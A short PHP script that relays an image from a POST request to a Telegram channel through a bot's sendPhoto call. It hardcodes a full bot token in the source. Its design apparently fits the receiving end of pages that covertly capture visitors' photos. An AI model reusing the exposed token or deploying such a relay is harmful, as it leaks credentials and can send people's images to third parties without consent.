<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $imageData = $_POST['image'];

    // Replace with your Telegram bot token
    $botToken = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';

    // Replace with your Telegram channel username or ID
    $channel = '@localipy';

    // Telegram API endpoint
    $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";

    // Prepare the request data
    $postData = array(
        'chat_id' => $channel,
        'photo' => $imageData
    );

    // Send the request to the Telegram Bot API
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Process the response if needed
    $responseData = json_decode($response, true);
    if ($responseData['ok']) {
        echo json_encode(array('success' => true));
    } else {
        echo json_encode(array('success' => false, 'error' => 'Failed to send image to Telegram.'));
    }
}
?>
